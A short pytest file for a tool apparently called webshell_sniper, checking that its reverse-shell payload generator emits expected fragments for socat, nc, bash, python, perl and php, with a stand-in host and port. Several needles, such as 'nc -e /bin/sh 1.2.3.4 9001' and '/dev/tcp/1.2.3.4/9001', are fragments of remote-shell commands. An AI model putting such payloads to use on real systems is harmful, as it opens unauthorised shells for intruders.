"""Reverse-shell payload generation (no network)."""

import pytest

from webshell_sniper.features.revshell import _payload


@pytest.mark.parametrize(
    ("method", "binary", "needle"),
    [
        ("socat", "/usr/bin/socat", "tcp-connect:1.2.3.4:9001"),
        ("nc", "nc", "-e /bin/sh 1.2.3.4 9001"),
        ("bash", "bash", "/dev/tcp/1.2.3.4/9001"),
        ("python", "python3", "socket.socket()"),
        ("perl", "perl", "use Socket"),
        ("php", "php", "fsockopen"),
    ],
)
def test_payload_contains_expected(method, binary, needle):
    assert needle in _payload(method, binary, "1.2.3.4", "9001")


def test_unknown_method_raises():
    with pytest.raises(ValueError, match="unknown reverse-shell method"):
        _payload("ruby", "ruby", "1.2.3.4", "9001")
